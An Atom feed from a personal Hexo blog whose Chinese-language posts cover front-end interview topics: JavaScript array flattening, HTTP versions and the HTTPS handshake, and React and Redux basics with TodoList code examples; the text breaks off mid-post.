<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pluto</title>
  
  
  <link href="http://yoursite.com/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-07-29T13:35:01.643Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>pluto</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>32个手写JS题目</title>
    <link href="http://yoursite.com/2021/07/29/32%E4%B8%AA%E6%89%8B%E5%86%99JS%E9%A2%98%E7%9B%AE/"/>
    <id>http://yoursite.com/2021/07/29/32%E4%B8%AA%E6%89%8B%E5%86%99JS%E9%A2%98%E7%9B%AE/</id>
    <published>2021-07-29T08:01:07.000Z</published>
    <updated>2021-07-29T13:35:01.643Z</updated>
    
    <content type="html"><![CDATA[<h1 id="32个手写JS题目"><a href="#32个手写JS题目" class="headerlink" title="32个手写JS题目"></a>32个手写JS题目</h1><h2 id="数组扁平化"><a href="#数组扁平化" class="headerlink" title="数组扁平化"></a>数组扁平化</h2><p>数组扁平化是指将一个多维数组变为一个一维数组</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>]]], <span class="hljs-number">6</span>];<span class="hljs-comment">// =&gt; [1, 2, 3, 4, 5, 6]</span></code></pre></div><h3 id="使用flat"><a href="#使用flat" class="headerlink" title="使用flat"></a>使用flat</h3><div class="hljs"><pre><code class="hljs javascript"></code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;32个手写JS题目&quot;&gt;&lt;a href=&quot;#32个手写JS题目&quot; class=&quot;headerlink&quot; title=&quot;32个手写JS题目&quot;&gt;&lt;/a&gt;32个手写JS题目&lt;/h1&gt;&lt;h2 id=&quot;数组扁平化&quot;&gt;&lt;a href=&quot;#数组扁平化&quot; class=&quot;header</summary>
      
    
    
    
    <category term="前端八股文" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF%E5%85%AB%E8%82%A1%E6%96%87/"/>
    
    
    <category term="前端面试" scheme="http://yoursite.com/tags/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95/"/>
    
    <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>HTTP各版本与HTTPS</title>
    <link href="http://yoursite.com/2021/07/26/HTTP%E5%90%84%E7%89%88%E6%9C%AC%E4%B8%8EHTTPS/"/>
    <id>http://yoursite.com/2021/07/26/HTTP%E5%90%84%E7%89%88%E6%9C%AC%E4%B8%8EHTTPS/</id>
    <published>2021-07-26T06:25:03.000Z</published>
    <updated>2021-07-26T12:49:30.857Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTP协议各版本内容与HTTPS"><a href="#HTTP协议各版本内容与HTTPS" class="headerlink" title="HTTP协议各版本内容与HTTPS"></a>HTTP协议各版本内容与HTTPS</h1><p>HTTP协议 ：Hyper Text Transfer Protocol（超文本传输协议）,是用于从万维网（WWW:World Wide Web）服务器传输超文本到本地浏览器的传送协议。是互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准。</p><p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）的协议。</p><p>在HTTP之前，需要先了解下TCP/IP协议族，它可以分成4层：</p><ul><li><p><strong>应用层</strong></p><p>应用层规定了向用户提供应用服务时通信的协议，如：</p><p>TCP/IP 协议族内预存了各类通用的应用服务协议。比如，FTP（File Transfer Protocol，文件传输协议）、DNS（Domain Name System，域名系统）以及HTTP协议。</p></li><li><p><strong>传输层</strong></p><p>传输层对接上层应用层，提供处于网络连接中两台计算机之间的数据传输所使用的协议。</p><p>在传输层有两个性质不同的协议：TCP（Transmission Control Protocol，传输控制协议）和UDP（User Data Protocol，用户数据报协议）。<br>TCP协议是全双工的，即发送数据和接收数据是同步进行的，就好像我们打电话一样，说话的同时也能听见。TCP协议在建立和断开连接时有三次握手和四次挥手，因此在传输的过程中更稳定可靠但同时就没UDP那么高效了。<br>UDP协议是面向无连接的，也就是说在正式传递数据之前不需要先建立连接。UDP 协议不保证有序且不丢失的传递到对端，也就是说不够稳定，但也正因如此，UDP协议比TCP更加高效和轻便。</p></li><li><p><strong>网络层</strong></p><p>网络层规定了数据通过怎样的传输路线到达对方计算机传送给对方（IP协议等）。</p></li><li><p><strong>链路层</strong></p><p>用来处理连接网络的硬件部分，包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，即网卡），及光纤等物理可见部分（还包括连接器等一切传输媒介）。</p></li></ul><p>IP协议主要解决网络路由和寻址问题，TCP协议主要解决如何在IP层之上可靠地传递数据包，使得网络上接收端收到发送端所发出的所有包，并且顺序与发送顺序一致。TCP协议是可靠的、面向连接的。</p><h2 id="HTTP的基本优化"><a href="#HTTP的基本优化" class="headerlink" title="HTTP的基本优化"></a>HTTP的基本优化</h2><p>影响一个HTTP网络请求的因素主要有两个：带宽和延迟</p><ul><li><p>带宽：就是常说的网速。。。</p></li><li><p>延迟：</p><blockquote><ul><li>浏览器阻塞（HOL blocking）：浏览器会因为一些原因阻塞请求。浏览器对于同一个域名，同时只能有 4 个连接（这个根据浏览器内核不同可能会有所差异），超过浏览器最大连接数限制，后续请求就会被阻塞。</li><li>DNS 查询（DNS Lookup）：浏览器需要知道目标服务器的 IP 才能建立连接。将域名解析为 IP 的这个系统就是 DNS。这个通常可以利用DNS缓存结果来达到减少这个时间的目的。</li><li>建立连接（Initial connection）：HTTP 是基于 TCP 协议的，浏览器最快也要在第三次握手时才能捎带 HTTP 请求报文，达到真正的建立连接，但是这些连接无法复用会导致每次请求都经历三次握手和慢启动。三次握手在高延迟的场景下影响较明显，慢启动则对文件类大请求影响较大。</li></ul></blockquote></li></ul><h2 id="HTTP1-0与HTTP1-1"><a href="#HTTP1-0与HTTP1-1" class="headerlink" title="HTTP1.0与HTTP1.1"></a>HTTP1.0与HTTP1.1</h2><p>HTTP1.0最早在网页中使用是在1996年，那个时候只是使用一些较为简单的网页上和网络请求上，而HTTP1.1则在1999年才开始广泛应用于现在的各大浏览器网络请求中，同时HTTP1.1也是当前使用最为广泛的HTTP协议。 主要区别主要体现在：</p><ul><li><p>缓存处理：HTTP1.0中主要用header中的If-Modified-Since（从某个时间点算起，如果文件被修改了），Expires（一个绝对的过期时间），而HHTP1.1中添加了更多缓存控制策略，例如E-tag，If-Unmodified-Since（某个时间点算起，文件没有被修改）等</p></li><li><p>带宽优化和网络连接的使用：HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</p></li><li><p>错误通知的管理，在HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p></li><li><p>Host头处理，在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。</p></li><li><p>长连接，HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。</p><blockquote><p>在HTTP/1.0中默认使用短连接。也就是说，客户端和服务器每进行一次HTTP操作，就建立一次连接，任务结束就中断连接。当客户端浏览器访问的某个HTML或其他类型的Web页中包含有其他的Web资源（如JavaScript文件、图像文件、CSS文件等），每遇到这样一个Web资源，浏览器就会重新建立一个HTTP会话。比如，一个包含有许多图像的网页文件的多个请求和应答可以在一个连接中传输，但每个单独的网页文件的请求和应答仍然需要使用各自的连接。</p><p>在使用长连接的情况下，当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，客户端再次访问这个服务器时，会继续使用这一条已经建立的连接。Keep-Alive不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如Apache）中设定这个时间。实现长连接需要客户端和服务端都支持长连接。</p><p>HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。</p><p>而流水线是：若干个请求排队串行化单线程处理</p></blockquote></li></ul><h2 id="HTTP2-0"><a href="#HTTP2-0" class="headerlink" title="HTTP2.0"></a>HTTP2.0</h2><p>基于SPDY优化的：</p><ul><li><p>新的二进制格式（Binary Format），HTTP1.x的解析是基于文本。基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认0和1的组合。基于这种考虑HTTP2.0的协议解析决定采用二进制格式，实现方便且健壮。</p></li><li><p>多路复用（MultiPlexing），即连接共享，即每一个request都是是用作连接共享机制的。一个request对应一个id，这样一个连接上可以有多个request，每个连接的request可以随机的混杂在一起，接收方可以根据request的 id将request再归属到各自不同的服务端请求里面。</p><blockquote><p>HTTP2.0的多路复用和HTTP1.X中的长连接复用有什么区别？</p><ul><li>HTTP/1.* 一次请求-响应，建立一个连接，用完关闭；每一个请求都要建立一个连接；</li><li>HTTP/1.1 Pipeling解决方式为，若干个请求排队串行化单线程处理，后面的请求等待前面请求的返回才能获得执行机会，一旦有某请求超时等，后续请求只能被阻塞，毫无办法，也就是人们常说的线头阻塞；</li><li>HTTP/2多个请求可同时在一个连接上并行执行。某个请求任务耗时严重，不会影响到其它连接的正常执行；</li></ul></blockquote></li><li><p>header压缩，如上文中所言，对前面提到过HTTP1.x的header带有大量信息，而且每次都要重复发送，HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表，既避免了重复header的传输，又减小了需要传输的大小。</p></li><li><p>服务端推送（server push），例如我的网页有一个sytle.css的请求，在客户端收到sytle.css数据的同时，服务端会将sytle.js的文件推送给客户端，当客户端再次尝试获取sytle.js时就可以直接从缓存中获取到，不用再发请求了。</p></li></ul><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>由于 HTTP 天生明文传输的特性，在 HTTP 的传输过程中，任何人都有可能从中截获、修改或者伪造请求发送，所以可以认为 HTTP 是不安全的；在 HTTP 的传输过程中不会验证通信方的身份，因此 HTTP 信息交换的双方可能会遭到伪装，也就是没有用户验证；在 HTTP 的传输过程中，接收方和发送方并不会验证报文的完整性，综上，为了结局上述问题，HTTPS 应用而生。</p><p>HTTPS可以理解为HTTP+SSL/TLS， 即 HTTP 下加入 SSL 层，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL，用于安全的 HTTP 数据传输。</p><p>SSL（Secure Socket Layer，安全套接字层）：1994年为 Netscape 所研发，SSL 协议位于 TCP/IP 协议与各种应用层协议之间，为数据通讯提供安全支持。</p><p>TLS（Transport Layer Security，传输层安全）：其前身是 SSL，它最初的几个版本（SSL 1.0、SSL 2.0、SSL 3.0）由网景公司开发，1999年从 3.1 开始被 IETF 标准化并改名，发展至今已经有 TLS 1.0、TLS 1.1、TLS 1.2 三个版本。SSL3.0和TLS1.0由于存在安全漏洞，已经很少被使用到。TLS 1.3 改动会比较大，目前还在草案阶段，目前使用最广泛的是TLS 1.1、TLS 1.2。</p><p>过程：</p><ul><li><p>用户在浏览器发起HTTPS请求，默认使用服务端的443端口进行连接</p></li><li><p>HTTPS需要使用一套CA数字证书，证书内会附带一个公钥Pub，而与之对应的私钥Private保留在服务端不公开</p><blockquote><p>为什么需要证书？</p><p>如果单纯用非对称加密和对称加密的方法会出现的情况：1 客户端向服务器发出请求，服务器向客户端发送公钥A 2 中间人劫持公钥A，替换为公钥B，发给客户端 3 客户端将对称加密密钥C用B加密，发给服务器 4 中间人再次截取，解密出C，把C用A加密，发给服务器</p><p>这个过程客户端和服务器都不知道对称加密密钥已经泄露了。</p><p>而CA证书中，包含网站的公钥，并且通过数字签名防止公钥被中间人篡改。并且证书中包含域名，所以也无法伪装成别人的网站。</p></blockquote></li><li><p>服务端收到请求，返回配置好的包含公钥Pub的证书给客户端</p></li><li><p>客户端收到证书，校验合法性，主要包括是否在有效期内、证书的域名与请求的域名是否匹配，上一级证书是否有效（递归判断，直到判断到系统内置或浏览器配置好的根证书），如果不通过，则显示HTTPS警告信息，如果通过则继续</p></li><li><p>客户端生成一个用于对称加密的随机Key，并用证书内的公钥Pub进行加密，发送给服务端</p></li><li><p>服务端收到随机Key的密文，使用与公钥Pub配对的私钥Private进行解密，得到客户端真正想发送的随机Key</p></li><li><p>服务端使用客户端发送过来的随机Key对要传输的HTTP数据进行对称加密，将密文返回客户端</p></li><li><p>客户端使用随机Key对称解密密文，得到HTTP数据明文</p></li><li><p>后续HTTPS请求使用之前交换好的随机Key进行对称加解密</p><blockquote><p>每次进行HTTPS请求时都必须在SSL/TLS层进行握手传输密钥吗？</p><p>服务器会为每个浏览器（或客户端软件）维护一个session ID，在TLS握手阶段传给浏览器，浏览器生成好密钥传给服务器后，服务器会把该密钥存到相应的session ID下，之后浏览器每次请求都会携带session ID，服务器会根据session ID找到相应的密钥并进行解密加密操作，这样就不必要每次重新制作、传输密钥了！</p></blockquote></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTTP协议各版本内容与HTTPS&quot;&gt;&lt;a href=&quot;#HTTP协议各版本内容与HTTPS&quot; class=&quot;headerlink&quot; title=&quot;HTTP协议各版本内容与HTTPS&quot;&gt;&lt;/a&gt;HTTP协议各版本内容与HTTPS&lt;/h1&gt;&lt;p&gt;HTTP协议 ：Hy</summary>
      
    
    
    
    <category term="前端八股文" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF%E5%85%AB%E8%82%A1%E6%96%87/"/>
    
    
    <category term="前端面试" scheme="http://yoursite.com/tags/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95/"/>
    
    <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>React基础与一些问题</title>
    <link href="http://yoursite.com/2021/07/10/React%E5%9F%BA%E7%A1%80%E4%B8%8E%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2021/07/10/React%E5%9F%BA%E7%A1%80%E4%B8%8E%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</id>
    <published>2021-07-10T09:13:10.000Z</published>
    <updated>2021-07-29T16:43:46.006Z</updated>
    
    <content type="html"><![CDATA[<h1 id="React的基础操作与常考的一些问题"><a href="#React的基础操作与常考的一些问题" class="headerlink" title="React的基础操作与常考的一些问题"></a>React的基础操作与常考的一些问题</h1><h2 id="React基础"><a href="#React基础" class="headerlink" title="React基础"></a>React基础</h2><h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><ul><li><p>可以通过JS引入来使用react</p></li><li><p>也可以通过脚手架工具例如webpack等来构建</p></li><li><p>使用官方脚手架工具Create-react-app来构建(会直接下好react react-dom react-scripts等包)：</p><p>首先需要安装：</p><div class="hljs"><pre><code class="hljs jsx">npm install create-react-app -gcreate-react-app my-app <span class="hljs-comment">// my-app 为项目名称</span>cd my-app <span class="hljs-comment">// 已经构建好这个项目目录了</span></code></pre></div></li></ul><p>关于目录下一些文件的说明：</p><p>public/index.html:整个项目的html文件：</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"%PUBLIC_URL%/favicon.ico"</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1"</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"theme-color"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"#000000"</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span></span><span class="hljs-tag">      <span class="hljs-attr">name</span>=<span class="hljs-string">"description"</span></span><span class="hljs-tag">      <span class="hljs-attr">content</span>=<span class="hljs-string">"Web site created using create-react-app"</span></span><span class="hljs-tag">    /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>todolist<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"root"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p>src/index.js 项目的入口文件:</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> React <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;<span class="hljs-keyword">import</span> ReactDOM <span class="hljs-keyword">from</span> <span class="hljs-string">'react-dom'</span>;<span class="hljs-keyword">import</span> TodoList <span class="hljs-keyword">from</span> <span class="hljs-string">'./TodoList'</span>;ReactDOM.render(  &lt;TodoList /&gt;,  <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'root'</span>));</code></pre></div><p>很明显，它把TodoList这个玩意渲染到了‘root’这个节点上。</p><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><p>对于React中的组件，就例如这个TodoList，基本架子是这样的：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> React, &#123; Component, Fragment &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TodoList</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Component</span> </span>&#123;    <span class="hljs-keyword">constructor</span>(props) &#123;        <span class="hljs-keyword">super</span>(props);        <span class="hljs-keyword">this</span>.state = &#123;        inputVaule: <span class="hljs-string">'hello'</span>,        list[]        &#125;    &#125;    render() &#123;         <span class="hljs-keyword">return</span> ( &lt;Fragment&gt;&lt;input             value = &#123;<span class="hljs-keyword">this</span>.state.inputValue&#125;onChange = &#123;<span class="hljs-keyword">this</span>.handleInputChange.bind(<span class="hljs-keyword">this</span>)&#125;/&gt;&lt;ul&gt;&lt;<span class="hljs-regexp">/ul&gt;</span><span class="hljs-regexp">&lt;/</span>Fragment&gt;        );    &#125;    handleInputChange(e) &#123;        <span class="hljs-keyword">this</span>.setState(&#123;            inputValue: e.target.value        &#125;)    &#125;&#125; <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> TodoList;</code></pre></div><p>上面代码实现的功能是获取输入框中的值并显示在框里面，这需要组件有一个state保存它的数据，并且这个数据的修改只能通过setState()方法，触发事件后的回调函数需要绑定执行的this为本组件</p><p>button点击后将值push进list的代码不再赘述</p><h4 id="父组件向子组件传值"><a href="#父组件向子组件传值" class="headerlink" title="父组件向子组件传值"></a>父组件向子组件传值</h4><p>父组件中ul中的内容：在列表中<code>&lt;TodoItem&gt;</code>为需要渲染的列表项，也就是需要将list的内容放在这里</p><div class="hljs"><pre><code class="hljs javascript">&lt;ul&gt;&#123;<span class="hljs-keyword">this</span>.state.list.map(<span class="hljs-function">(<span class="hljs-params">item, index</span>) =&gt;</span> &#123;<span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">TodoItem</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&#123;item&#125;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">TodoItem</span>&gt;</span></span>&#125;)&#125;&lt;<span class="hljs-regexp">/ul&gt;</span></code></pre></div><p>用content将item传给子组件，TodoItem的结构如下：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> React, &#123; Component &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TodoItem</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Component</span> </span>&#123;    render() &#123;         <span class="hljs-keyword">return</span> (            &lt;div className = <span class="hljs-string">"TodoItem"</span> &gt;&#123;<span class="hljs-keyword">this</span>.props.content&#125;&lt;<span class="hljs-regexp">/div&gt;</span><span class="hljs-regexp">        );</span><span class="hljs-regexp">    &#125;</span><span class="hljs-regexp"></span><span class="hljs-regexp">&#125;</span><span class="hljs-regexp"></span><span class="hljs-regexp">export default TodoItem;</span></code></pre></div><p>类似上面这样，在props中就已经有content这个东西了</p><h4 id="子组件向父组件传值"><a href="#子组件向父组件传值" class="headerlink" title="子组件向父组件传值"></a>子组件向父组件传值</h4><p>实际上是在子组件中点击事件后，需要更改父组件中list的数据，比如删除功能，需要给子组件绑定点击函数，然后回调就是一个函数，而这个函数实际上可以是父组件传递给子组件的一个方法，子组件调用这个方法，传入触发点击的index，函数就能根据index操作父组件中的list，<strong>值得注意的是，父传子函数时记得绑定this</strong></p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> React, &#123; Component &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;<span class="hljs-keyword">import</span> PropTypes <span class="hljs-keyword">from</span> <span class="hljs-string">'prop-types'</span>;<span class="hljs-keyword">import</span> <span class="hljs-string">"./TodoItem.css"</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TodoItem</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Component</span> </span>&#123;    <span class="hljs-keyword">constructor</span>(props) &#123;        <span class="hljs-keyword">super</span>(props);        <span class="hljs-keyword">this</span>.handleClick = <span class="hljs-keyword">this</span>.handleClick.bind(<span class="hljs-keyword">this</span>);    &#125;    render() &#123;         <span class="hljs-keyword">const</span> &#123; content &#125; = <span class="hljs-keyword">this</span>.props;        <span class="hljs-keyword">return</span> (            &lt;div className = <span class="hljs-string">"TodoItem"</span> onClick = &#123;<span class="hljs-keyword">this</span>.handleClick&#125;&gt;&#123;content&#125;&lt;<span class="hljs-regexp">/div&gt;</span><span class="hljs-regexp">        );</span><span class="hljs-regexp">    &#125;</span><span class="hljs-regexp">    handleClick() &#123;</span><span class="hljs-regexp">        const &#123; deleteItem, index &#125; = this.props;</span><span class="hljs-regexp">        deleteItem(index);</span><span class="hljs-regexp">    &#125;</span><span class="hljs-regexp">&#125;</span><span class="hljs-regexp"></span><span class="hljs-regexp">export default TodoItem;</span></code></pre></div><h4 id="组件传值校验"><a href="#组件传值校验" class="headerlink" title="组件传值校验"></a>组件传值校验</h4><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> PropTypes <span class="hljs-keyword">from</span> <span class="hljs-string">'prop-types'</span>;TodoItem.propTypes = &#123;    content: PropTypes.string.isRequired, <span class="hljs-comment">// 必须项</span>    index: PropTypes.number,    deleteItem: PropTypes.func&#125;<span class="hljs-comment">// 如果没传content的默认值</span>TodoItem.defaultProps = &#123;    content: <span class="hljs-string">'undefined'</span>&#125;</code></pre></div><p><strong><em>注意，state和props的更新都会引起当前组件render函数的重新执行，而且父组件的重新渲染也会引起子组件的重新渲染！</em></strong></p><h4 id="React中的ref"><a href="#React中的ref" class="headerlink" title="React中的ref"></a>React中的ref</h4><p>reference的简写，是一个引用，可以用来操作DOM，例如在父组件的input标签中插入一个ref属性，可以获取到input这个节点，那我们就能用state中的一个变量保存它：</p><div class="hljs"><pre><code class="hljs javascript">&lt;input value = &#123;<span class="hljs-keyword">this</span>.state.inputValue&#125;onChange = &#123;<span class="hljs-keyword">this</span>.handleInputChange.bind(<span class="hljs-keyword">this</span>)&#125;ref = &#123;(input) =&gt; &#123;<span class="hljs-keyword">this</span>.input = input&#125;&#125;/&gt;</code></pre></div><p>之后设置state就可以：</p><div class="hljs"><pre><code class="hljs javascript">inputValue: <span class="hljs-keyword">this</span>.input.value</code></pre></div><h4 id="React中的setState"><a href="#React中的setState" class="headerlink" title="React中的setState"></a>React中的setState</h4><ul><li><p>setState是异步的，这样可以按批次来更新state，保证不会渲染太多次导致性能问题。</p></li><li><p>setState可以接收一个对象，也就是更新的state</p></li><li><p>setState也可以接收一个或两个函数，第一个函数是这样的：</p><div class="hljs"><pre><code class="hljs javascript">incrementCount() &#123;  <span class="hljs-keyword">this</span>.setState(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> &#123;    <span class="hljs-comment">// 重要：在更新的时候读取 `state`，而不是 `this.state`。</span>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-attr">count</span>: state.count + <span class="hljs-number">1</span>&#125;  &#125;);&#125;</code></pre></div><p>这样做可以保证需要用state做计算时用的一定是最新的state。而传入两个函数，则可以理解为是当完成state更新后回调第二个函数，做了一个异步的过程：</p><div class="hljs"><pre><code class="hljs javascript">incrementCount() &#123;  <span class="hljs-keyword">this</span>.setState(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> &#123;    <span class="hljs-comment">// 重要：在更新的时候读取 `state`，而不是 `this.state`。</span>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-attr">count</span>: state.count + <span class="hljs-number">1</span>&#125;  &#125;, () =&gt; &#123;      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`更新state拉<span class="hljs-subst">$&#123;state.count&#125;</span>`</span>)  &#125;);&#125;</code></pre></div></li></ul><h2 id="Redux基础"><a href="#Redux基础" class="headerlink" title="Redux基础"></a>Redux基础</h2><h3 id="引入-1"><a href="#引入-1" class="headerlink" title="引入"></a>引入</h3><div class="hljs"><pre><code class="hljs javascript">npm install redux --save</code></pre></div><p>新建store目录，store/index.js :</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; createStore &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'redux'</span>;<span class="hljs-keyword">const</span> store = createStore();<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> store;</code></pre></div><p>此时的store，作为“图书馆管理员”，缺少一个本子来辅助它记录各种数据，新建reducer.js，并将它引入store：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> defaultState = &#123;    inputValue: <span class="hljs-string">''</span>,    list: []&#125;<span class="hljs-keyword">const</span> reducer = <span class="hljs-function">(<span class="hljs-params">state = defaultState, action</span>) =&gt;</span> &#123;    <span class="hljs-keyword">let</span> new_state = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(state));    <span class="hljs-keyword">switch</span> (action.type) &#123;        <span class="hljs-keyword">default</span>:            <span class="hljs-keyword">return</span> state;    &#125;&#125;<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> reducer;</code></pre></div><p>reducer指明了store中应该有inputValue和list两种数据：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> reducer <span class="hljs-keyword">from</span> <span class="hljs-string">'./reducer'</span><span class="hljs-keyword">const</span> store = createStore(reducer);</code></pre></div><p>在组件代码中可以获取值：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> store <span class="hljs-keyword">from</span> <span class="hljs-string">'./store'</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Copmonent</span> </span>&#123;<span class="hljs-keyword">constructor</span>(props) &#123;<span class="hljs-keyword">super</span>(props);<span class="hljs-keyword">this</span>.state = store.getState();&#125;&#125;</code></pre></div><h3 id="拆分与传值"><a href="#拆分与传值" class="headerlink" title="拆分与传值"></a>拆分与传值</h3><p>actionTypes：导出一些定义好的常量</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> INPUT_VALUE_CHANGE = <span class="hljs-string">'input_value_change'</span>;<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> INPUT_BUTTON_CLICK = <span class="hljs-string">'input_button_click'</span>;<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> DELETE_ITEM = <span class="hljs-string">'delete_item'</span>;<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> INIT_DATA = <span class="hljs-string">'init_data'</span>;</code></pre></div><p>actionCreator：在组件中如果触发了某些事件，调用了函数，可以在函数中调用这个来创建对应的action并派发给store，让store在reducer中找到对应操作后更改数据：</p><p>组件中：</p><div class="hljs"><pre><code class="hljs javascript">&lt;input onChange = &#123;<span class="hljs-keyword">this</span>.handleInputChange.bind(<span class="hljs-keyword">this</span>)&#125;&gt;&lt;<span class="hljs-regexp">/input&gt;</span><span class="hljs-regexp"></span><span 